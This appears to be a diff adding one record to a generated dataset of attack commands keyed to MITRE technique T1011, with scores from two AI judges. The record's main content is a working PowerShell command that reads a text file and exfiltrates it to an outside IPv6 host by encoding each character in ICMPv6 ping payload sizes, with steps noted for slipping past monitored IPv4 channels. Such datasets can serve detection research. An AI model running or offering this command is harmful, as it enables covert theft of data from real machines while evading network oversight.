@@ -1,0 +1,47 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$d='fd00:0:be:ef::42'; $lines=Get-Content 'C:\\Users\\Public\\message.txt'; foreach($line in $lines){ Test-Connection -ComputerName $d -Count 1 -BufferSize 900 -IPv6 -Quiet | Out-Null; $line.ToCharArray() | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (900 + [byte][char]$_) -IPv6 -Quiet | Out-Null } }",
+  "explanation": "Frames text exfiltration over ICMPv6 by sending a start-of-line marker payload size followed by per-character payload sizes, using ICMPv6 as the alternate medium per T1011.",
+  "rationale_steps": [
+    "Iterate lines, emitting a fixed-size sync marker for each line.",
+    "Encode each character into the ICMP payload size with a known base.",
+    "Use IPv6 addressing to avoid commonly monitored IPv4 channels."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f38205c7-2dc0b3c8",
+  "source_prompt_hash": "f38205c7",
+  "timestamp_utc": "2025-09-30T08:38:57.416507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 4,
+        "syntactic_justification": "The PowerShell is well-formed with balanced quoting, braces, and separators, but the -IPv6 parameter may not be valid on all Test-Connection versions.",
+        "semantic_score": 4,
+        "semantic_justification": "It reads lines from a file and signals each line via ICMPv6 echo requests whose payload sizes encode a start marker and per-character values, matching T1011 behavior, though success depends on Test-Connection's IPv6 support and the target's reachability.",
+        "combined_score": 4.0,
+        "confidence": 0.7,
+        "timestamp": "2025-10-01T14:46:31.751897Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed, with correct syntax for variables, loops, commandlets, and parameter passing, including balanced parentheses and braces.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves text exfiltration over ICMPv6 by encoding character data into the `BufferSize` of `Test-Connection` packets, which is a direct application of packet size manipulation for traffic signaling (T1011).",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T14:46:58.679316Z"
+      }
+    ],
+    "llm_average_syntactic": 4.5,
+    "llm_average_semantic": 4.5,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
